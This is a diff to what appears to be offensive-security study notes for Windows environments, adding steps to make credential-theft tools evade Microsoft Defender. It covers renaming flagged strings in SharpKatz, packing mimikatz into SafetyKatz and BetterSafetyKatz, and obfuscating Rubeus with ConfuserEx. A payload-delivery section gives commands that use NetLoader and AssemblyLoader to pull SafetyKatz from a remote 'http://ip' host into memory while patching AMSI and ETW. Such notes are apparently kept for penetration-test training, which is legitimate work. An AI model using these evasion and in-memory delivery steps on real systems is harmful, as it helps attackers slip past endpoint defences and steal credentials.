@@ -90,14 +90,38 @@ Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
 
 
 
+
+
 **Identify Code/Strings Defender may flag**\
 https://github.com/matterpreter/DefenderCheck => C# without builds\
 [https://gist.github.com/daddycocoaman/108d807e89a0f9731304bc848fa219f0](https://gist.github.com/daddycocoaman/108d807e89a0f9731304bc848fa219f0) => python [https://github.com/rasta-mouse/ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) => also c# without builds
 
 DefenderCheck.exe path-to-sharpkatz.exe\
-Visutal studio, CTRL + H, Replace all "Credentials" with "whatever", Scope as "Entire Solution", Replace All, Build andrecheck
+Visutal studio, CTRL + H, Replace all "Credentials" with "whatever", Scope as "Entire Solution", Replace All, Build and recheck
+
+OutCompressedDll.ps1 for SafetyKatz\
+[https://github.com/PowerShellMafia/PowerSploit/blob/master/ScriptModification/Out-CompressedDll.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/ScriptModification/Out-CompressedDll.ps1)\
+Out-compressedDll mimikatz.exe > output.txt\
+Copy $EncodedCompressedFile from output.txt and replace compressedMimikatzString in constants.cs of safetykatz\
+Copy the byte size from the output file an replace it in program.cs on line 111 & 116\
+Build and recheck
+
+BetterSafetyKatz\
+Use mimikatz\_trunk.zip and convert to base64\
+Modify program.cs - add new variable with base64, comment the download code, convert base64 to bytes and pass it to zipStream
+
+rubeus.exe - ConfuserEx [https://github.com/mkaring/ConfuserEx](https://github.com/mkaring/ConfuserEx)\
 
 
+## Payload Delivery
+
+NetLoader https://github.com/Flangvik/NetLoader - Used to load binary from filepath or URL an patch AMSI & ETW wihile executing
+
+Loader.exe -path http://ip/safetykatz.exe
+
+Assemblyload can be used to load NetLoader in-memory from a URL and then loads binary from filepath\
+assemblyload.exe [https://github.com/KINGSABRI/AssemblyLoader](https://github.com/KINGSABRI/AssemblyLoader) ????\
+assemblyload.exe http://ip/loader.exe -path http://ip/safetykatz.exe
 
 
 
